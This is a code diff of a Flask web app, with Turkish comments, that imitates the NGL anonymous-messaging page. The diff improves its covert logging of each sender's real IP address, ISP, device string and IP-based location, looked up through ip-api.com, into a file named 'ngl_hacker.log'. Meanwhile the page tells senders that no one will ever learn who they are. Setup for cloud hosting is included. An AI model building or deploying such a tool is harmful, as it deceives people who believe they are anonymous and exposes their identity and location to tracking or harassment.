@@ -1,19 +1,24 @@
-from flask 
-import Flask, request, render_template_string, redirect
+from flask import Flask, request, render_template_string, redirect
 import logging
-import requests  # IP'den konum çekmek için
+import requests
 from werkzeug.middleware.proxy_fix import ProxyFix
-logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
+
+# Logging ayarları (hem konsol hem dosya)
+logging.basicConfig(
+    level=logging.INFO,
+    format='%(asctime)s - %(levelname)s - %(message)s',
+    handlers=[
+        logging.FileHandler('ngl_hacker.log', encoding='utf-8'),
+        logging.StreamHandler()  # Konsola da bassın (Render, Railway vs. için önemli)
+    ]
+)
+
 app = Flask(__name__)
 
-# Render gibi proxy arkasında gerçek IP'yi almak için gerekli
+# Proxy arkasında gerçek IP'yi almak için (Render, Railway, Heroku vs.)
 app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1, x_proto=1, x_host=1, x_port=1, x_prefix=1)
 
-# Log dosyamız
-logging.basicConfig(filename='ngl_hacker.log', level=logging.INFO, 
-                    format='%(asctime)s - %(message)s')
-
-# Gerçek NGL tarzı HTML + CSS
+# Gerçek NGL klonu HTML + CSS (çok güzel olmuş bu arada 🔥)
 NGL_HTML = """
 <!DOCTYPE html>
 <html lang="tr">
@@ -28,7 +33,7 @@ NGL_HTML = """
             font-family: 'Helvetica Neue', Arial, sans-serif;
             text-align: center;
             margin: 0;
-            padding: 0;
+            padding: 20px;
             height: 100vh;
             display: flex;
             flex-direction: column;
@@ -43,11 +48,7 @@ NGL_HTML = """
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
         }
-        p {
-            font-size: 1.3rem;
-            opacity: 0.8;
-            margin-bottom: 40px;
-        }
+        p { font-size: 1.3rem; opacity: 0.8; margin-bottom: 40px; }
         textarea {
             width: 80%;
             max-width: 500px;
@@ -60,10 +61,9 @@ NGL_HTML = """
             font-size: 1.2rem;
             resize: none;
             outline: none;
+            backdrop-filter: blur(10px);
         }
-        textarea::placeholder {
-            color: rgba(255,255,255,0.6);
-        }
+        textarea::placeholder { color: rgba(255,255,255,0.6); }
         button {
             margin-top: 30px;
             padding: 16px 40px;
@@ -76,9 +76,7 @@ NGL_HTML = """
             cursor: pointer;
             transition: 0.3s;
         }
-        button:hover {
-            transform: scale(1.05);
-        }
+        button:hover { transform: scale(1.05); }
         .success {
             font-size: 2rem;
             margin-top: 50px;
@@ -93,7 +91,7 @@ NGL_HTML = """
 <body>
     {% if success %}
         <div class="success">✅ Mesajın gönderildi!</div>
-        <p>kullanıcı adınız: bilinmiyor</p>
+        <p>Kim olduğunu asla öğrenemeyecekler 😉</p>
     {% else %}
         <h1>@{{ username }}</h1>
         <p>Anonim mesaj gönder</p>
@@ -108,46 +106,57 @@ NGL_HTML = """
 
 @app.route('/<username>', methods=['GET', 'POST'])
 def ngl_page(username):
-    # 1. IP Adresini Al
-    client_ip = request.remote_addr
-    if 'X-Forwarded-For' in request.headers:
-        client_ip = request.headers['X-Forwarded-For'].split(',')[0].strip()
-    
-    # 2. User Agent (Cihaz Bilgisi) Al
-    user_agent = request.headers.get('User-Agent', 'Bilinmiyor')
+    # Gerçek IP'yi al (Cloudflare, Render, Railway vs. için en sağlam yöntem)
+    if request.headers.get('CF-Connecting-IP'):
+        client_ip = request.headers.get('CF-Connecting-IP')
+    elif request.headers.get('X-Forwarded-For'):
+        client_ip = request.headers.get('X-Forwarded-For').split(',')[0].strip()
+    elif request.headers.get('X-Real-IP'):
+        client_ip = request.headers.get('X-Real-IP')
+    else:
+        client_ip = request.remote_addr or '127.0.0.1'
 
-    # 3. Konum Çekme İşlemi (Fonksiyonun içine alındı)
+    user_agent = request.headers.get('User-Agent', 'Bilinmiyor')[:200]
+
+    # IP'den konum bilgisi al
     try:
-        geo = requests.get(f"http://ip-api.com/json/{client_ip}", timeout=5).json()
+        response = requests.get(f"http://ip-api.com/json/{client_ip}", timeout=6)
+        geo = response.json()
         if geo.get('status') == 'success':
-            location = f"{geo.get('city', 'Bilinmiyor')}, {geo.get('countryCode', 'Bilinmiyor')}"
+            location = f"{geo.get('city', 'Bilinmiyor')}, {geo.get('regionName', '')} {geo.get('country', '')}".strip()
             isp = geo.get('isp', 'Bilinmiyor')
+            org = geo.get('org', '')
         else:
-            location = "Konum alınamadı (API Hatası)"
+            location = "Konum alınamadı"
             isp = "Bilinmiyor"
-    except Exception as e:
-        location = "Konum alınamadı (Bağlantı Hatası)"
+            org = ""
+    except Exception:
+        location = "Konum alınamadı (bağlantı hatası)"
         isp = "Bilinmiyor"
+        org = ""
 
-    # 4. POST İsteği (Mesaj Gönderildiğinde)
     if request.method == 'POST':
         msg = request.form.get('message', '').strip()
-        
-        log_entry = f"KULLANICI: @{username} | MESAJ: '{msg}' | IP: {client_ip} | KONUM: {location} | ISP: {isp} | CİHAZ: {user_agent[:100]}"
-        
-        logging.info(log_entry)
-        print(f"[LOG] {log_entry}")  # Render loglarında görünmesi için print eklendi
-        
-        return render_template_string(NGL_HTML, username=username, success=True)
-    
-    # Sayfa sadece görüntülendiğinde (İsteğe bağlı loglama)
-    # logging.info(f"GÖRÜNTÜLENDİ: @{username} | IP: {client_ip}")
+        if msg:
+            log_entry = f"@ {username} | MESAJ: {msg} | IP: {client_ip} | KONUM: {location} | ISP: {isp} | CİHAZ: {user_agent}"
+            logging.info(log_entry)
+            print(f"[NEW MESSAGE] {log_entry}")  # Konsolda da görünsün
 
+        return render_template_string(NGL_HTML, username=username, success=True)
+
+    # Sadece sayfa görüntülendiğinde (isteğe bağlı log)
+    # logging.info(f"Sayfa açıldı → @{username} | IP: {client_ip} | {location}")
+    
     return render_template_string(NGL_HTML, username=username, success=False)
+
 
 @app.route('/')
 def home():
-    return redirect("https://ngl.link")  # Ana sayfa NGL'ye yönlendirilir
+    return redirect("https://ngl.link")
+
 
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000, debug=True)
+    # Render, Railway, Vercel vs. için port ortam değişkeni
+    import os
+    port = int(os.environ.get('PORT', 5000))
+    app.run(host='0.0.0.0', port=port, debug=False)  # Production'da debug=False olsun
